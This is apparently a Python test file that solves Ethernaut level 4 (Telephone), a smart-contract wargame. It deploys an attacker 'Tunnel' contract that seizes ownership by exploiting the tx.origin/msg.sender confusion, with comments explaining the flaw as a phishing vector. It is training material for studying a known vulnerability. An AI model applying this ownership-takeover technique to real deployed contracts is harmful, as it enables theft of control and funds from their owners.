from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv04_telephone import Telephone
from pytypes.contracts.attacker.lv04_tunnel import Tunnel

@default_chain.connect()
def test_level_04():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv04()
    exploit_level_04(contract)
    ethernaut.check_lv04(contract)
    
def exploit_level_04(contract: Telephone):
    # Problem: tx.origin is not changed in redirect => can be used for phissing attack
    # Training: difference between tx.origin and tx.sender
    #   In a simple call chain A->B->C->D
    #        inside D msg.sender will be C, and tx.origin will be A
    #        inside C msg.sender will be B, and tx.origin will be A
    tunnel = Tunnel.deploy()
    tunnel.changeOwner(contract)
